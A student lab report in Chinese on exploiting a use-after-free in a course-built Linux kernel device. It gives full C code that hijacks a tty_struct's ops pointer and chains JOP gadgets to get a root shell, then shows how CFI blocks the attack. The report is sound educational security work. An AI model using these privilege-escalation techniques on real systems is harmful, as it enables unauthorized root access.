---
counter: True
comment: True
---

# Linux 内核 JOP 攻击与防护

!!! abstract
    系统安全 lab3（bonus）实验报告

    !!! warning "仅供学习参考，请勿抄袭"

## 实验目标

了解 UAF (Use-After-Free) 类型的漏洞以及 JOP (Jump-oriented programming) 攻击原理，并在此基础上，通过现有的 UAF 漏洞和 JOP 编程，实现获取 Linux 内核的 root 权限的 PoC (Proof of Concept)，并读取一个只有 root 权限下可读的文件，获取 flag。

- 利用 gdb 调试内核，获取内核关键函数和 gadget 的地址；
- 了解 Linux 设备提供的接口和其调用逻辑，并尝试使用 Linux 设备接口进行基础编程，了解 Linux 如何利用系统调用的方式触发内核设备中相应的函数；
- 理解 UAF 漏洞原理，以及漏洞的利用方式；使用 gdb-multiarch 对所提供的未压缩的内核 (vmlinux) 进行调试，查找设备 UAF 漏洞所在的位置及触发条件，获取内核 tty_struct 结构体的内容，并利用设备接口控制该结构体的内容，为 root 内核做准备；
- 了解 JOP 攻击的原理，尝试利用设备接口触发 UAF 漏洞，并挟持控制流，通过 JOP 攻击绕过 PXN 机制，获取内核的 root 权限；
- 利用提供的 gadget 片段，构造 JOP 攻击跳转链，获取 root 权限的 shell。

## 实验过程

### Task 1

因为在 zjudev 设备中只有一个 zjudev 结构体，开启多个设备其实在共用一个结构体，因此在开启两个 zjudev 设备后 free 掉其中一个，则另一个 zjudev 设备的 dev_buf 指针值仍然保留，存在 UAF 漏洞。

这里可以创建两个 zjudev 设备，然后利用一个设备分配一个 0x2B8 大小的堆，再通过 close 释放掉这个堆。接下来开启 ptmx 设备，这时有概率会将 ptmx 的 tty_struct 结构体创建在之前 free 掉的设备的堆上，而这个位置可以通过另一个 zjudev 设备来进行 UAF 读取。

> **Question 2. 如何确定自己所控制的指针一定被分配给 tty_struct 结构体？**

因为 ptmx 设备在初始化的时候会分配 tty_struct 结构体，这个结构体的头四字节为一个 int，表示 magic，当 magic 为 0x5401 时时，表示这个结构体是一个 tty_struct 结构体。所以我们可以通过 zjudev UAF 读取，如果头四字节时 0x5401 的话，则说明我们所控制的指针是 tty_struct 结构体。否则不是，则需要重新创建 ptmx 设备。

这部分代码如下：

```c 
struct tty_struct {
    int magic;
    char rest[0x2B8 - 4];
} tty_buf;

int main() {
    int dev_fd1 = open("/dev/zjudev", O_RDWR);
    int dev_fd = open("/dev/zjudev", O_RDWR);
    ioctl(dev_fd1, 0x0001, 0x2B8);
    close(dev_fd1);
    int ptmx_fd;
    while (1) {
        ptmx_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
        memset(&tty_buf, 0, sizeof(tty_buf));
        read(dev_fd, &tty_buf, 0x2B8 - 1);
        printf("[*] tty_buf.magic: 0x%x\n", tty_buf.magic);
        if (tty_buf.magic == 0x5401) {
            break;
        }
        close(ptmx_fd);
    }
    printf("[+] ptmx_fd: %d\n", ptmx_fd);
    close(ptmx_fd);
    return 0;
}
```

./qemu.sh 启动内核后，cat > exp.c 将上述代码粘贴写入 exp.c 文件，然后 gcc exp.c -o exp 编译再通过 ./exp 运行，可见我们可以成功控制到 tty_struct 结构体：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/lab3/img1.png" width="70%" style="margin: 0 auto;">
</div>


### Task 2

tty_struct 结构体中有 const struct tty_operations *ops 指针，这个指针指向的 tty_operations 结构体中包含 36 个函数指针，每个函数指针指向了一个针对 ptmx 设备进行操作的函数，其中第五个函数是 close。我们在 Task 1 中控制 zjudev 的 buffer 和 tty_struct 指向了同一位置，并且 zjudev 可以通过 write 对于 buffer 进行写入，所以我们可以覆盖 ops 指针，使其指向我们自己的一个结构体（因为没有 SMAP 保护，所以内核可以读取用户态我们创建的结构体），其中第五个函数指针的位置写为 hack_cred 函数的地址。这样在覆盖之后我们 close(ptmx) 的时候就会查找到 close 函数指针的位置，然后调用 hack_cred 函数进行提权。

因为没有开启 KASLR，所以 hack_cred 的地址可以直接在 System.map 中找到：

```text
❯ cat kernel/nocfi/System.map | grep hack_cred
ffff80001083aa84 T hack_cred
```

所以这部分的攻击代码如下：

```c 
size_t hack_cred_addr = 0xffff80001083aa84;

struct tty_operations {
    char prefix[8 * 4];
    void *close;
    char rest[8 * 31];
} hack_ops;

struct tty_struct {
    int magic;
    char kref_dev_driver_data[20];
    struct tty_operations *ops;
    char rest[0x2B8 - 32];
} tty_buf, hack_buf;

void task2(int dev_fd, int ptmx_fd) {
    printf("[*] task2 hacking...\n");
    memcpy(&hack_buf, &tty_buf, sizeof(tty_buf));
    hack_ops.close = (void *)hack_cred_addr;
    hack_buf.ops = &hack_ops;
    write(dev_fd, &hack_buf, 32);
    close(ptmx_fd);
    system("/bin/sh");
    return;
}
```

同样在内核中运行后，我们可以成功获取到 root 权限并读取 flag 文件：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/lab3/img2.png" width="70%" style="margin: 0 auto;">
</div>

可以发现在进入 task2 函数之后，成功进行了提权，并在 root 权限下进入了 shell，得到 flag 内容为 NzYyNDcyMzI5MTAy。

> **Question 3. 为什么不能直接通过 UAF 控制 cred 结构体直接修改其内容？有没有办法能够通过 UAF 来利用新版本的 cred 结构体呢？**

因为在内核启动时，调用了 cred_init 函数如下：

```c 
/*
 * initialise the credentials stuff
 */
void __init cred_init(void)
{
    /* allocate a slab in which we can store credentials */
    cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred), 0,
            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL);
}
```

然后在 prepare_kernel_cred 的时候会创建新的 cred 结构体：

```c 
struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
    const struct cred *old;
    struct cred *new;

    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
...
```

而这里用的是 kmem_cache_alloc 函数，并从 cred_jar 中进行分配，而这个 cache 在创建的时候带有 SLAB_ACCOUNT 标记，表示进行隔离，这个堆块要单独存在。所以这种情况下 alloc 的内存不会和 kmalloc 释放掉的重合，因此我们无法通过 UAF 来控制 cred 结构体。并且因为 cred 结构体还有 cred_jar 都在内核态，所以在用户态也无法利用 kmem_cache_alloc 来 UAF 控制 cred 结构体。

### Task 3

直接通过 System.map 获得 gadget 地址以及 prepare_kernel_cred 和 commit_creds 地址：

```text
❯ cat kernel/nocfi/System.map | grep zju_gadget
ffff80001083aa44 T zju_gadget1
ffff80001083aa5c T zju_gadget2
ffff80001083aa74 T zju_gadget3
❯ cat kernel/nocfi/System.map | grep prepare_kernel_cred
ffff8000100b6030 T prepare_kernel_cred
...
❯ cat kernel/nocfi/System.map | grep commit_creds
ffff8000100b5bac T commit_creds
...
```

接下来我们需要通过三个 gadget 来完成对 commit_creds(prepare_kernel_cred(0)) 的调用。首先看这三个 gadget 的功能：

- gadget1：将 x0+0x38 地址的值赋值给 x1，把 x2 的值赋值给 x0，然后跳转到 x1 地址；
- gadget2：给 x0 赋值 0，将 x2+0x28 地址的值赋值给 x1，然后跳转到 x1 地址；
- gadget3：直接 ret。

并且在 ARM 的调用规范中参数分别存储在 x0 x1 x2 中，返回值在 x0 中。

从里往外看，我们需要先调用 prepare_kernel_cred(0)，在三个 gadget 中 gadget2 将第一个参数 x0 赋值为了 0，所以可以通过 gadget2 来调用 prepare_kernel_cred，这就需要 x1 也就是 x2+0x28 地址处的值为 prepare_kernel_cred 的地址。如果要利用 tty_struct 来进行 x2+0x28 的存储，则需要先获取 tty_struct 的地址。

为了获取 tty_struct 地址，在实验指导中我们知道 ioctl 函数在调用 tty_operations 中的 ioctl 函数的时候就已经将第一个参数即 x0 改为 tty_struct 地址了，所以我们直接用 gadget3 返回即可将地址存入 x0 即返回值中。

接下来在调用了 prepare_kernel_cred(0) 之后，x0 也就是返回值就是带有 root 权限的 cred 结构体的地址了，接下来只需要将这个地址作为第一个参数调用 commit_creds 函数即可，这里可以使用 gadget1，将 commit_creds 地址存入 x0+0x38 也就是 tty_struct+0x38 中，然后将第二个参数即 x2 赋值为 root_cred，这样在调用的时候就会赋值到 x0 中作为第一个参数调用 commit_creds。

另外需要注意，ioctl 返回的类型是 int，只有四个字节，而这些 struct 的地址是 8 字节，但恰好头四字节都是 0xffff0000 所以只需要或上 0xffff000000000000 就可以了。

<!-- 因为调用 gadget1 时 x0 是我们不可控的，一定是 tty_struct 地址，所以我们肯定要先获取 tty_struct 地址。这样在利用 gadget2 的时候也顺势将 tty_struct 作为 -->

```c 
size_t zju_gadget1_addr = 0xffff80001083aa44;
size_t zju_gadget2_addr = 0xffff80001083aa5c;
size_t zju_gadget3_addr = 0xffff80001083aa74;
size_t prepare_kernel_cred_addr = 0xffff8000100b6030;
size_t commit_creds_addr = 0xffff8000100b5bac;

struct tty_operations {
    char prefix[8 * 4];
    void *close;
    char useless[8 * 7];
    void *ioctl;
    char rest[8 * 23];
} hack_ops;

struct tty_struct {
    int magic;
    char kref_dev_driver_data[20];
    struct tty_operations *ops;
    char useless[8];
    size_t tty_0x28;
    size_t tty_0x30;
    size_t tty_0x38;
    char rest[0x2B8 - 0x40];
} tty_buf, hack_buf;

void task3(int dev_fd, int ptmx_fd) {
    printf("[*] task3 hacking...\n");
    memcpy(&hack_buf, &tty_buf, sizeof(tty_buf));
    hack_buf.ops = &hack_ops;
    hack_buf.tty_0x28 = prepare_kernel_cred_addr;
    hack_buf.tty_0x38 = commit_creds_addr;
    write(dev_fd, &hack_buf, 0x40);
    hack_ops.ioctl = (void *)zju_gadget3_addr;
    size_t tty_struct_addr = ioctl(ptmx_fd, 0x0, 0x0) | 0xffff000000000000;
    printf("[*] tty_struct_addr: 0x%lx\n", tty_struct_addr);
    hack_ops.ioctl = (void *)zju_gadget2_addr;
    size_t root_cred = ioctl(ptmx_fd, 0x0, &hack_buf) | 0xffff000000000000;
    printf("[*] root_cred: 0x%lx\n", root_cred);
    hack_ops.ioctl = (void *)zju_gadget1_addr;
    ioctl(ptmx_fd, 0x0, root_cred);
    system("/bin/sh");
    return;
}
```

同样编译运行 exp，可以看到我们成功获取到了 root 权限：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/lab3/img3.png" width="70%" style="margin: 0 auto;">
</div>

但实际上即使不获取 tty_struct 结构体的地址也可以。我们前面需要 tty_struct 地址的位置只有在用 gadget2 的时候需要 tty_struct 作为 x2 来使得跳转的地址在 tty_struct+0x28 中。但由于没有开启 SMAP 保护，所以内核也可以读取用户态的内存，只需要在程序里随便创建一个 buffer 然后将其 0x28 开始的位置写为 prepare_kernel_cred 函数地址，在将这个 buffer 的地址作为 x2 调用 gadget2 即可，这样我们 gadget3 也不需要了，只需要两次 ioctl 就可以完成：

```c 
size_t zju_gadget1_addr = 0xffff80001083aa44;
size_t zju_gadget2_addr = 0xffff80001083aa5c;
size_t prepare_kernel_cred_addr = 0xffff8000100b6030;
size_t commit_creds_addr = 0xffff8000100b5bac;

struct tty_operations {
    char prefix[8 * 4];
    void *close;
    char useless[8 * 7];
    void *ioctl;
    char rest[8 * 23];
} hack_ops;

struct tty_struct {
    int magic;
    char kref_dev_driver_data[20];
    struct tty_operations *ops;
    char useless[24];
    size_t tty_0x38;
    char rest[0x2B8 - 0x40];
} tty_buf, hack_buf;

struct for_gadget2 {
    char useless[0x28];
    size_t x2_0x28;
} gadget2_buf;

void task3(int dev_fd, int ptmx_fd) {
    printf("[*] task3 hacking...\n");
    memcpy(&hack_buf, &tty_buf, sizeof(tty_buf));
    hack_buf.ops = &hack_ops;
    hack_buf.tty_0x38 = commit_creds_addr;
    write(dev_fd, &hack_buf, 0x40);
    hack_ops.ioctl = (void *)zju_gadget2_addr;
    gadget2_buf.x2_0x28 = prepare_kernel_cred_addr;
    size_t root_cred = ioctl(ptmx_fd, 0x0, &gadget2_buf) | 0xffff000000000000;
    printf("[*] root_cred: 0x%lx\n", root_cred);
    hack_ops.ioctl = (void *)zju_gadget1_addr;
    ioctl(ptmx_fd, 0x0, root_cred);
    system("/bin/sh");
    return;
}
```

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/lab3/img4.png" width="70%" style="margin: 0 auto;">
</div>

> **Question 4：为什么第二步可以直接 ret 获取到 tty_struct 结构体的地址？ret 执行前后的控制流是什么样的？**

前面其实已经分析过，我们在调用 Linux 提供的 ioctl 系统调用的时候参数为 fd, cmd, arg，而它会进一步根据 fd 来分配给不同设备的 ioctl 的处理函数，在分配给 ptmx 的时候就是调用 tty_operations.ioctl(struct tty_struct \*tty, unsigned int cmd, unsigned long arg)，其 tty_struct 地址作为第一个参数是存储在 x0 中的，这时如果这个 ioctl 函数的内容只有 ret，那么就会返回 x0 的值，也就是 tty_struct 的地址。

ret 执行前后的控制流为：

- task3 函数
- 调用 ioctl(ptmx_fd, 0x0, 0x0)
- ioctl 调用 tty_operations.ioctl(&tty_struct, 0, 0)（其实是 zju_gadget3）
- zju_gadget3 中 ret 返回 tty_struct 地址
- 返回到 ioctl 中，再返回到 task3 中

### Task 4

Linux 代码的 /drivers/tty/tty_ioctl.c 中就有很多间接调用，而且函数本身也很短，比如第一个：

```c 
unsigned int tty_chars_in_buffer(struct tty_struct *tty)
{
    if (tty->ops->chars_in_buffer)
        return tty->ops->chars_in_buffer(tty);
    return 0;
}
```

没开启 CFI 的汇编如下：

```
ffff800010765554 <tty_chars_in_buffer>:
ffff800010765554:	d503233f 	paciasp
ffff800010765558:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
ffff80001076555c:	910003fd 	mov	x29, sp
ffff800010765560:	f9400c08 	ldr	x8, [x0, #24]
ffff800010765564:	f9402d08 	ldr	x8, [x8, #88]
ffff800010765568:	b4000068 	cbz	x8, ffff800010765574 <tty_chars_in_buffer+0x20>
ffff80001076556c:	d63f0100 	blr	x8
ffff800010765570:	14000002 	b	ffff800010765578 <tty_chars_in_buffer+0x24>
ffff800010765574:	2a1f03e0 	mov	w0, wzr
ffff800010765578:	a8c17bfd 	ldp	x29, x30, [sp], #16
ffff80001076557c:	d50323bf 	autiasp
ffff800010765580:	d65f03c0 	ret
```

开启了 CFI 的汇编如下：

```
ffff800008bd95f0 <tty_chars_in_buffer>:
ffff800008bd95f0:	d503233f 	paciasp
ffff800008bd95f4:	d10083ff 	sub	sp, sp, #0x20
ffff800008bd95f8:	f9400c08 	ldr	x8, [x0, #24]
ffff800008bd95fc:	a9017bfd 	stp	x29, x30, [sp, #16]
ffff800008bd9600:	910043fd 	add	x29, sp, #0x10
ffff800008bd9604:	f9402d08 	ldr	x8, [x8, #88]
ffff800008bd9608:	b4000128 	cbz	x8, ffff800008bd962c <tty_chars_in_buffer+0x3c>
ffff800008bd960c:	d00061c9 	adrp	x9, ffff800009813000 <regulator_get_current_limit.cfi_jt>
ffff800008bd9610:	912ac129 	add	x9, x9, #0xab0
ffff800008bd9614:	cb090109 	sub	x9, x8, x9
ffff800008bd9618:	93c90d29 	ror	x9, x9, #3
ffff800008bd961c:	f100253f 	cmp	x9, #0x9
ffff800008bd9620:	54000102 	b.cs	ffff800008bd9640 <tty_chars_in_buffer+0x50>  // b.hs, b.nlast
ffff800008bd9624:	d63f0100 	blr	x8
ffff800008bd9628:	14000002 	b	ffff800008bd9630 <tty_chars_in_buffer+0x40>
ffff800008bd962c:	2a1f03e0 	mov	w0, wzr
ffff800008bd9630:	a9417bfd 	ldp	x29, x30, [sp, #16]
ffff800008bd9634:	910083ff 	add	sp, sp, #0x20
ffff800008bd9638:	d50323bf 	autiasp
ffff800008bd963c:	d65f03c0 	ret
ffff800008bd9640:	a90023e0 	stp	x0, x8, [sp]
ffff800008bd9644:	d2931760 	mov	x0, #0x98bb                	// #39099
ffff800008bd9648:	f2bc3380 	movk	x0, #0xe19c, lsl #16
ffff800008bd964c:	f000ee42 	adrp	x2, ffff80000a9a4000 <dev_attr_active.104611>
ffff800008bd9650:	f2ce3760 	movk	x0, #0x71bb, lsl #32
ffff800008bd9654:	91090042 	add	x2, x2, #0x240
ffff800008bd9658:	f2f02900 	movk	x0, #0x8148, lsl #48
ffff800008bd965c:	aa0803e1 	mov	x1, x8
ffff800008bd9660:	97db5e95 	bl	ffff8000082b10b4 <__cfi_slowpath_diag>
ffff800008bd9664:	a94023e0 	ldp	x0, x8, [sp]
ffff800008bd9668:	17ffffef 	b	ffff800008bd9624 <tty_chars_in_buffer+0x34>
```

主要检测流程在于：

```
ffff800008bd9608:	b4000128 	cbz	x8, ffff800008bd962c <tty_chars_in_buffer+0x3c>
ffff800008bd960c:	d00061c9 	adrp	x9, ffff800009813000 <regulator_get_current_limit.cfi_jt>
ffff800008bd9610:	912ac129 	add	x9, x9, #0xab0
ffff800008bd9614:	cb090109 	sub	x9, x8, x9
ffff800008bd9618:	93c90d29 	ror	x9, x9, #3
ffff800008bd961c:	f100253f 	cmp	x9, #0x9
ffff800008bd9620:	54000102 	b.cs	ffff800008bd9640 <tty_chars_in_buffer+0x50>  // b.hs, b.nlast
ffff800008bd9624:	d63f0100 	blr	x8
```

x8 是要跳转的 tty->ops->chars_in_buffer 函数的地址，如果 x8 为 0 则跳转到结尾返回，否则进行比较，先 adrp x9, ... 将 regulator_get_current_limit.cfi_jt 的高地址载入 x9，再加上 0xab0，然后用 x8 减去 x9，然后右移 3 位，再和 0x9 比较，如果大于等于 0x9 则为非法地址，跳转到函数末尾的处理流程通过调用 __cfi_slowpath_diag 引发 CFI Failure 否则正常跳转到 x8 进行调用。

在开启了 CFI 的 kernel 中运行 Task 2 中修改了几个地址后的攻击代码，发现并不成功：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/lab3/img5.png" width="100%" style="margin: 0 auto;">
</div>

出现了段错误，然后我们通过 dmesg 查看内核日志，可以发现：

<div style="text-align: center;">
<img src="/assets/images/sec/syssec/lab3/img6.png" width="100%" style="margin: 0 auto;">
</div>

可以看到在写入 zjudev 后调用 close 的时候出现了 CFI Failure，导致攻击失败。

## 思考题回答

> **Question 1：为什么会这样？为什么两次分配的内存块地址会一样？**

因为在 glibc 的堆管理机制中，malloc 会需要通过 brk 系统调用来分配内存，这一步比较消耗时间，为了避免频繁分配和释放内存造成的性能影响，glibc 会将释放掉的内存 chunk 放入一些 bin 的链表中，在下次分配同样大小的 chunk 时，可以直接从 bin 中取出来，不需要再次通过 brk 进行分配。所以如果我们刚刚 free 了一个 chunk，然后又 malloc 了同样大小的 chunk，则大概率会直接从 bin 中取出来，所以地址是一样的。

Question 2-4 在上面 Task 1-3 的实验过程中已经回答。

